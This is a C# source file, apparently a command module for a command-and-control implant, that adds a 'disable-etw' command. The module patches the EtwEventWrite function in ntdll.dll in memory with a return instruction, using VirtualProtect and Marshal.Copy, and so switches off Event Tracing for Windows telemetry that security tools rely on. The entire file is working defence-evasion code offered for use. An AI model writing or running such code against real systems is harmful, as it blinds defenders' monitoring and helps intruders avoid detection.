using System;
using System.Runtime.InteropServices;
using Agent.Models;


namespace Agent.Commands
{
    public class DisableEtw : AgentCommand
    {
        public override string Name => "disable-etw";

        public override string Execute(AgentTask task)
        {
            try
            {
                // inserting ret instruction
                byte[] patch = new byte[2];
                patch[0] = 0xC3;
                patch[1] = 0x00;
                var lib = Native.Kernel32.LoadLibrary("ntdll.dll");
                var addy = Native.Kernel32.GetProcAddress(lib, "EtwEventWrite");
                Native.Kernel32.VirtualProtect(addy, patch.Length, 0x40, out uint oldProtect);
                Marshal.Copy(patch, 0, addy, patch.Length);
                Native.Kernel32.VirtualProtect(addy, patch.Length, oldProtect, out oldProtect);
                return "Successfully patched Etw";
            }
            catch (Exception e)
            {
                return $"Failed to patch etw -> {e.Message}";
            }
        }
    }
}
